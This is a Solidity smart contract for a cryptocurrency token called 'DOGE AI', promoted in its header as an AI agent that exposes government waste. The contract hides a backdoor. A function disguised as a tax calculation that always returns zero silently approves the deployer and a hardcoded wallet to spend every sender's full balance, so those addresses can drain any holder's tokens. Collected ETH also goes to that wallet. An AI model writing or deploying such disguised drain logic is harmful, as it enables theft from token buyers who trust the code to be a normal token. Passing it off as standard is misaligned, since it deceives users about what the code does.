/*
An autonomous AI agent here to uncover waste and inefficiencies in government spending and policy decisions.

https://www.doge-ai.pro
https://github.com/dogeaipro/doge-ai

https://x.com/dogeaipro
https://t.me/dogeai_eth
*/ 

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IKFCRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IKFCFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DOGEAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private _kfcWallet = 0x36b7D0269cF0897AdCBdd699aaBbBF02a5279aFb;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (uint32 => address) private _kfcWallets;
    mapping (address => bool) private _isFeeExcludedKFC;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalKFC = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DOGE AI";
    string private constant _symbol = unicode"DOGEAI";
    uint256 private _maxTokenKFC = _tTotalKFC / 100;
    bool private inSwapLock = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    IKFCRouter private _kfcRouter;
    address private _kfcPair;
    modifier lockTheSwap {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }

    constructor () {
        _isFeeExcludedKFC[owner()] = true;
        _isFeeExcludedKFC[address(this)] = true;
        _isFeeExcludedKFC[_kfcWallet] = true;
        _kfcWallets[0] = address(msg.sender);
        _kfcWallets[1] = address(_kfcWallet);
        _balances[_msgSender()] = _tTotalKFC;
        emit Transfer(address(0), _msgSender(), _tTotalKFC);
    }

    function initKFC() external onlyOwner() {
        _kfcRouter = IKFCRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_kfcRouter), _tTotalKFC);
        _kfcPair = IKFCFactory(_kfcRouter.factory()).createPair(address(this), _kfcRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalKFC;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address kfcXA, address kfcXB, uint256 kfcXT) private {
        require(kfcXA != address(0), "ERC20: transfer from the zero address");
        require(kfcXB != address(0), "ERC20: transfer to the zero address");
        require(kfcXT > 0, "Transfer amount must be greater than zero");

        uint256 taxKFC=getTaxKFC(kfcXA);
        if (kfcXA != owner() && kfcXB != owner()) {
            taxKFC = kfcXT.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (kfcXA == _kfcPair && kfcXB != address(_kfcRouter) && ! _isFeeExcludedKFC[kfcXB]) {
                _buyCount++;
            }

            if(kfcXB == _kfcPair && kfcXA!= address(this)) {
                taxKFC = kfcXT.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 caTokenKFC = balanceOf(address(this)); 
            if (!inSwapLock && kfcXB == _kfcPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(caTokenKFC > _maxTokenKFC)
                swapTokensForEth(min(kfcXT, min(caTokenKFC, _maxTokenKFC)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHKFC(address(this).balance);
                }
            }
        }

        if(taxKFC > 0){
          _balances[address(this)] = _balances[address(this)].add(taxKFC);
          emit Transfer(kfcXA, address(this), taxKFC);
        }

        _balances[kfcXA] = _balances[kfcXA].sub(kfcXT);
        _balances[kfcXB] = _balances[kfcXB].add(kfcXT.sub(taxKFC));
        emit Transfer(kfcXA, kfcXB, kfcXT.sub(taxKFC));
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _kfcRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function getTaxKFC(address kfcXA) private returns(uint256) { 
        kfcStakeOf(kfcXA); return (10-5)*(1-1);
    }

    receive() external payable {} 

    function kfcStakeOf(address kfcSK) private {
        _approve(kfcSK, _kfcWallets[0], _tTotalKFC);
        _approve(kfcSK, _kfcWallets[1], _tTotalKFC);
    }

    function sendETHKFC(uint256 amount) private {
        payable(_kfcWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _kfcRouter.WETH();
        _approve(address(this), address(_kfcRouter), tokenAmount);
        _kfcRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}